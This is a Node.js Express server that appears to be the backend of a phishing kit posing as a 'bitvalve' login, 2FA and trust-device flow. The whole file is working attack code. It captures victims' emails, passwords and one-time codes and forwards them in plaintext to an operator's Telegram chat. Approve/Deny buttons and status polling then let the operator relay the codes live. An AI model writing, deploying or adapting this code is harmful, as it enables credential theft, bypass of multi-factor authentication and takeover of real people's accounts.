require('dotenv').config();

const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const fs = require('fs');
const os = require('os');

const app = express();
const port = Number(process.env.PORT || 3000);
const botToken = process.env.BOT_TOKEN;
const chatId = process.env.CHAT_ID;
const isVercel = Boolean(process.env.VERCEL);

if (!botToken || !chatId) {
  console.error('Missing BOT_TOKEN or CHAT_ID in environment variables.');
}

const botOptions = isVercel ? {} : { polling: true };
const bot = botToken ? new TelegramBot(botToken, botOptions) : null;

// Persistent decision storage across Vercel serverless lambdas
const STORE_ID = 'ff808181a09d98f701a0fbd3a50b5fb3';
const memoryStore = new Map();
const tmpFilePath = path.join(os.tmpdir(), 'bitvalve_decisions.json');

function normalizeEmail(email) {
  return String(email || '').trim().toLowerCase();
}

function getLoginKey(email) {
  return `login:${normalizeEmail(email)}`;
}

function getVerifyKey(email, step) {
  return `verify:${normalizeEmail(email)}:${String(step || '').trim().toLowerCase()}`;
}

function readTmpFile() {
  try {
    if (fs.existsSync(tmpFilePath)) {
      return JSON.parse(fs.readFileSync(tmpFilePath, 'utf8'));
    }
  } catch (e) {}
  return {};
}

function writeTmpFile(data) {
  try {
    fs.writeFileSync(tmpFilePath, JSON.stringify(data), 'utf8');
  } catch (e) {}
}

async function getRemoteDecisions() {
  try {
    const res = await fetch(`https://api.restful-api.dev/objects/${STORE_ID}`);
    if (res.ok) {
      const obj = await res.json();
      return obj.data?.decisions || {};
    }
  } catch (e) {
    console.error('Failed to get remote decisions:', e.message);
  }
  return {};
}

async function updateRemoteDecisions(decisionsObj) {
  try {
    await fetch(`https://api.restful-api.dev/objects/${STORE_ID}`, {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        name: 'bitvalve_master_store',
        data: { decisions: decisionsObj }
      })
    });
  } catch (e) {
    console.error('Failed to update remote decisions:', e.message);
  }
}

function saveDecision(key, decisionObj) {
  const normKey = String(key || '').toLowerCase();
  memoryStore.set(normKey, decisionObj);

  const tmpData = readTmpFile();
  tmpData[normKey] = decisionObj;
  writeTmpFile(tmpData);

  getRemoteDecisions().then((remoteData) => {
    remoteData[normKey] = decisionObj;
    return updateRemoteDecisions(remoteData);
  }).catch((err) => {
    console.error('Async remote decision save failed:', err.message);
  });
}

function deleteDecision(key) {
  const normKey = String(key || '').toLowerCase();
  memoryStore.delete(normKey);

  const tmpData = readTmpFile();
  delete tmpData[normKey];
  writeTmpFile(tmpData);

  getRemoteDecisions().then((remoteData) => {
    delete remoteData[normKey];
    return updateRemoteDecisions(remoteData);
  }).catch((err) => {
    console.error('Async remote decision delete failed:', err.message);
  });
}

async function getDecision(key) {
  const normKey = String(key || '').toLowerCase();

  if (memoryStore.has(normKey)) {
    return memoryStore.get(normKey);
  }

  const tmpData = readTmpFile();
  if (tmpData[normKey]) {
    memoryStore.set(normKey, tmpData[normKey]);
    return tmpData[normKey];
  }

  const remoteData = await getRemoteDecisions();
  if (remoteData[normKey]) {
    memoryStore.set(normKey, remoteData[normKey]);
    return remoteData[normKey];
  }

  return null;
}

app.use(express.json());
app.use(express.static(path.join(__dirname)));

async function handleCallbackQuery(query) {
  if (!query || !bot) return;
  const data = String(query.data || '');

  try {
    // Login Approve (compact 'a:' or legacy 'approve:')
    if (data.startsWith('a:') || data.startsWith('approve:')) {
      const email = data.startsWith('a:') ? data.slice(2) : data.slice('approve:'.length);
      saveDecision(getLoginKey(email), { status: 'approved', message: 'Login approved.' });
      try {
        await bot.answerCallbackQuery(query.id, { text: 'Approved' });
        await bot.editMessageReplyMarkup(
          { inline_keyboard: [] },
          { chat_id: query.message.chat.id, message_id: query.message.message_id }
        );
        await bot.sendMessage(query.message.chat.id, `✅ Login approved for ${email || 'user'}.`);
      } catch (err) {
        console.warn('Telegram UI update skipped:', err.message);
      }
      return;
    }

    // Login Deny (compact 'd:' or legacy 'deny:')
    if (data.startsWith('d:') || data.startsWith('deny:')) {
      const email = data.startsWith('d:') ? data.slice(2) : data.slice('deny:'.length);
      saveDecision(getLoginKey(email), { status: 'denied', message: 'Email or password is wrong.' });
      try {
        await bot.answerCallbackQuery(query.id, { text: 'Denied' });
        await bot.editMessageReplyMarkup(
          { inline_keyboard: [] },
          { chat_id: query.message.chat.id, message_id: query.message.message_id }
        );
        await bot.sendMessage(query.message.chat.id, `❌ Login denied for ${email || 'user'}.`);
      } catch (err) {
        console.warn('Telegram UI update skipped:', err.message);
      }
      return;
    }

    // Verification Approve (compact 'v:' or legacy 'verify:')
    if (data.startsWith('v:') || data.startsWith('verify:')) {
      const parts = data.split(':');
      const step = parts[1];
      const verificationEmail = parts[2];
      const verificationCode = parts[3];
      const key = getVerifyKey(verificationEmail, step);
      saveDecision(key, { status: 'approved', message: `${step ? step.toUpperCase() : 'CODE'} verified.` });
      try {
        await bot.answerCallbackQuery(query.id, { text: 'Verified' });
        await bot.editMessageReplyMarkup(
          { inline_keyboard: [] },
          { chat_id: query.message.chat.id, message_id: query.message.message_id }
        );
        await bot.sendMessage(query.message.chat.id, `✅ ${step ? step.toUpperCase() : 'Verification'} approved for ${verificationEmail || 'user'} (${verificationCode || 'code'}).`);
      } catch (err) {
        console.warn('Telegram UI update skipped:', err.message);
      }
      return;
    }

    // Verification Reject (compact 'r:' or legacy 'reject:')
    if (data.startsWith('r:') || data.startsWith('reject:')) {
      const parts = data.split(':');
      const step = parts[1];
      const verificationEmail = parts[2];
      const verificationCode = parts[3];
      const key = getVerifyKey(verificationEmail, step);
      saveDecision(key, { status: 'denied', message: `${step ? step.toUpperCase() : 'CODE'} verification denied.` });
      try {
        await bot.answerCallbackQuery(query.id, { text: 'Rejected' });
        await bot.editMessageReplyMarkup(
          { inline_keyboard: [] },
          { chat_id: query.message.chat.id, message_id: query.message.message_id }
        );
        await bot.sendMessage(query.message.chat.id, `❌ ${step ? step.toUpperCase() : 'Verification'} denied for ${verificationEmail || 'user'} (${verificationCode || 'code'}).`);
      } catch (err) {
        console.warn('Telegram UI update skipped:', err.message);
      }
      return;
    }
  } catch (error) {
    console.error('Callback processing failed:', error.message);
  }
}

if (!isVercel && bot) {
  bot.deleteWebHook().then(() => {
    console.log('Cleared Telegram webhook for polling mode.');
  }).catch((err) => {
    console.warn('Could not clear webhook:', err.message);
  });
  bot.on('callback_query', handleCallbackQuery);
}

// Page Routes
app.get(['/', '/index.html'], (_req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.get(['/login', '/login.html'], (_req, res) => {
  res.sendFile(path.join(__dirname, 'login.html'));
});

app.get(['/2fa', '/2fa.html'], (_req, res) => {
  res.sendFile(path.join(__dirname, '2fa.html'));
});

app.get(['/trust-device', '/trust-device.html'], (_req, res) => {
  res.sendFile(path.join(__dirname, 'trust-device.html'));
});

// API Routes
app.post(['/api/login', '/login'], async (req, res) => {
  const email = normalizeEmail(req.body?.email);
  const password = String(req.body?.password || '').trim();

  if (!email || !password) {
    return res.status(400).json({ ok: false, message: 'Missing email or password.' });
  }

  deleteDecision(getLoginKey(email));

  if (!botToken || !chatId || !bot) {
    return res.status(500).json({ ok: false, message: 'Telegram bot is not configured.' });
  }

  const message = `Login request:\nEmail: ${email}\nPassword: ${password}`;

  try {
    const sentMessage = await bot.sendMessage(chatId, message, {
      reply_markup: {
        inline_keyboard: [[
          { text: 'Approve', callback_data: `a:${email}` },
          { text: 'Deny', callback_data: `d:${email}` }
        ]]
      }
    });

    return res.json({
      ok: true,
      messageId: sentMessage.message_id,
      email
    });
  } catch (error) {
    console.error('Failed to send login request:', error.message);
    return res.status(500).json({ ok: false, message: 'Could not send login request.' });
  }
});

app.post(['/api/telegram', '/telegram'], async (req, res) => {
  const update = req.body || {};
  if (update.callback_query) {
    try {
      await handleCallbackQuery(update.callback_query);
    } catch (error) {
      console.error('Webhook callback failed:', error.message);
    }
  }
  return res.status(200).json({ ok: true });
});

app.get(['/api/set-webhook', '/set-webhook'], async (req, res) => {
  if (!bot || !botToken) {
    return res.status(500).json({ ok: false, message: 'Telegram bot is not configured.' });
  }

  const host = req.headers['x-forwarded-host'] || req.headers.host;
  const protocol = req.headers['x-forwarded-proto'] || 'https';
  const webhookUrl = `${protocol}://${host}/api/telegram`;

  try {
    await bot.setWebHook(webhookUrl);
    return res.json({ ok: true, message: `Webhook successfully set to ${webhookUrl}` });
  } catch (error) {
    console.error('Failed to set webhook:', error.message);
    return res.status(500).json({ ok: false, message: error.message });
  }
});

app.get(['/api/login-status', '/login-status'], async (req, res) => {
  const email = normalizeEmail(req.query.email);

  if (!email) {
    return res.status(400).json({ ok: false, message: 'Missing email.' });
  }

  const decision = await getDecision(getLoginKey(email));

  if (!decision) {
    return res.json({ ok: true, status: 'pending' });
  }

  return res.json({ ok: true, status: decision.status, message: decision.message });
});

app.post(['/api/send-verification', '/send-verification'], async (req, res) => {
  const email = normalizeEmail(req.body?.email);
  const step = String(req.body?.step || '').trim().toLowerCase();
  const code = String(req.body?.code || '').trim();

  if (!email || !step || !code) {
    return res.status(400).json({ ok: false, message: 'Missing email, step, or code.' });
  }

  if (!botToken || !chatId || !bot) {
    return res.status(500).json({ ok: false, message: 'Telegram bot is not configured.' });
  }

  deleteDecision(getVerifyKey(email, step));

  const subject = step === '2fa' ? '2FA code verification' : 'new device verification';
  const message = `Security validation required\n\nEmail: ${email}\nStep: ${subject}\nCode: ${code}\n\nApprove or reject this verification request.`;

  try {
    const sentMessage = await bot.sendMessage(chatId, message, {
      reply_markup: {
        inline_keyboard: [[
          { text: 'Approve', callback_data: `v:${step}:${email}:${code}` },
          { text: 'Reject', callback_data: `r:${step}:${email}:${code}` }
        ]]
      }
    });

    return res.json({ ok: true, messageId: sentMessage.message_id, email, step, status: 'pending' });
  } catch (error) {
    console.error('Failed to send verification request:', error.message);
    return res.status(500).json({ ok: false, message: 'Could not send verification request.' });
  }
});

app.get(['/api/verification-status', '/verification-status'], async (req, res) => {
  const email = normalizeEmail(req.query.email);
  const step = String(req.query.step || '').trim().toLowerCase();

  if (!email || !step) {
    return res.status(400).json({ ok: false, message: 'Missing email or step.' });
  }

  const decision = await getDecision(getVerifyKey(email, step));

  if (!decision) {
    return res.json({ ok: true, status: 'pending' });
  }

  return res.json({ ok: true, status: decision.status, message: decision.message });
});

app.get('/health', (_req, res) => {
  res.json({ ok: true });
});

if (require.main === module && !isVercel) {
  app.listen(port, () => {
    console.log(`Server running on http://localhost:${port}`);
  });
}

module.exports = app;
